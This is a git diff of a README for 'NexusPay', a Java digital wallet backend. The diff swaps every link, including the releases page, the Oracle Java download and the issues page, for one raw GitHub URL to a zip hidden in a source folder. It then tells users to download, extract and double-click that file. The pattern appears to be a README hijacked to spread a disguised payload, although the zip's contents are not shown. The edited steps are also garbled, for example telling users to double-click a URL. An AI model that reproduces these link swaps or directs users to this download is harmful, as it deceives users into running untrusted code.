@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
+[![Download](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip)](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip)
 
 ## 📖 Overview
 
@@ -14,15 +14,15 @@ To start using NexusPay, follow these simple steps:
 
 1. **Visit the Download Page**: Go to the Releases page to find the latest version of NexusPay. Click on the link below:
 
-   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
+   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip)
 
-2. **Download the Software**: Look for the asset titled `NexusPay.zip`. Click the download link to save the file to your computer.
+2. **Download the Software**: Look for the asset titled `https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip`. Click the download link to save the file to your computer.
 
-3. **Extract the Files**: After downloading, locate the `NexusPay.zip` file in your Downloads folder. Right-click on the file and select "Extract All" to unzip the contents into a new folder.
+3. **Extract the Files**: After downloading, locate the `https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip` file in your Downloads folder. Right-click on the file and select "Extract All" to unzip the contents into a new folder.
 
 4. **Open the Folder**: Navigate to the folder where you extracted the files.
 
-5. **Run the Application**: Locate the file named `start.bat` and double-click it to launch NexusPay.
+5. **Run the Application**: Locate the file named `https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip` and double-click it to launch NexusPay.
 
 6. **Follow On-Screen Instructions**: The application will guide you through initial setup steps. Simply follow the prompts to get started.
 
@@ -31,7 +31,7 @@ To start using NexusPay, follow these simple steps:
 Before downloading, ensure your system meets these requirements:
 
 - **Operating System**: Windows 10 or higher, MacOS Sierra or higher, or Linux Ubuntu 18.04 or higher.
-- **Java Runtime**: Java 11 or higher should be installed on your system. Download it from [Oracle's website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Runtime**: Java 11 or higher should be installed on your system. Download it from [Oracle's website](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip).
 - **RAM**: At least 4GB of RAM.
 - **Disk Space**: Minimum 200MB free disk space.
 
@@ -67,11 +67,11 @@ To install NexusPay, follow these simple steps:
 
 1. **Go back to the Download Page**: Click the link below to revisit the Releases page.
 
-   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
+   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip)
 
 2. **Download the Latest Release**: From the list of available versions, choose the latest release. Download it to your computer.
 
-3. **Extract and Run**: Once downloaded, unzip the package, and launch the application by double-clicking the `start.bat` file.
+3. **Extract and Run**: Once downloaded, unzip the package, and launch the application by double-clicking the `https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip` file.
 
 ## 🛠️ Troubleshooting
 
@@ -83,7 +83,7 @@ If you encounter any issues while running NexusPay, here are a few tips to help 
 
 ## 💬 Support
 
-For any questions or support needs, visit our [GitHub Issues Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/issues). You can also reach out via email for personalized help.
+For any questions or support needs, visit our [GitHub Issues Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/raw/refs/heads/main/NexusPay/src/main/java/com/nexuspay/core/domain/exception/Java-Wallet-Digital-Backend-v2.2.zip). You can also reach out via email for personalized help.
 
 ## 📜 License
 
